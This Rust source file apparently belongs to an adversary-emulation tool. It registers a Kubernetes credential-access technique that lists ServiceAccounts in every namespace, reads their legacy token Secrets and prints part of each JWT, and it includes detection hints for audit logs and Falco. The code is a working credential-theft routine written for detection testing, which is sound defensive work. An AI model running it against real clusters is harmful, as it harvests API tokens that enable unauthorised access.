use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use kube::{Api, Client};
use k8s_openapi::api::core::v1::{Secret, ServiceAccount};

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set.", e))?;

    // List service accounts across all namespaces
    let sas: Api<ServiceAccount> = Api::all(client.clone());
    let sa_list = sas
        .list(&Default::default())
        .await
        .map_err(|e| anyhow::anyhow!("Failed to list service accounts: {}", e))?;

    println!("Found {} ServiceAccount(s) — checking for associated tokens:", sa_list.items.len());

    for sa in &sa_list.items {
        let ns = sa.metadata.namespace.as_deref().unwrap_or("default");
        let name = sa.metadata.name.as_deref().unwrap_or("<unnamed>");

        // Look for secrets that belong to this SA (legacy token secrets)
        let secrets_api: Api<Secret> = Api::namespaced(client.clone(), ns);
        let secrets = match secrets_api.list(&Default::default()).await {
            Ok(list) => list,
            Err(_) => continue,
        };

        for secret in &secrets.items {
            let secret_type = secret.type_.as_deref().unwrap_or("");
            if secret_type != "kubernetes.io/service-account-token" {
                continue;
            }
            // Check if this secret belongs to this SA
            let sa_annotation = secret
                .metadata
                .annotations
                .as_ref()
                .and_then(|a| a.get("kubernetes.io/service-account.name"))
                .map(|s| s.as_str())
                .unwrap_or("");

            if sa_annotation != name {
                continue;
            }

            let secret_name = secret.metadata.name.as_deref().unwrap_or("<unnamed>");
            let token = secret
                .data
                .as_ref()
                .and_then(|d| d.get("token"))
                .map(|b| String::from_utf8_lossy(&b.0).to_string())
                .unwrap_or_else(|| "<no token>".to_string());

            println!(
                "  SA [{}/{}] => secret '{}' token (first 40 chars): {}...",
                ns,
                name,
                secret_name,
                token.chars().take(40).collect::<String>()
            );
        }
    }

    println!("Credential access complete — service account tokens extracted");
    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.credential-access.steal-serviceaccount-token",
        friendly_name: "Steal Kubernetes Service Account Tokens",
        description: "Lists ServiceAccounts across all namespaces and reads their associated legacy token Secrets, stealing JWT tokens that can be used to authenticate to the Kubernetes API.",
        detection: "Kubernetes audit log: list serviceaccounts and get secrets by unexpected identity. Falco: Read service account tokens.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::CredentialAccess],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: None,
    }
}
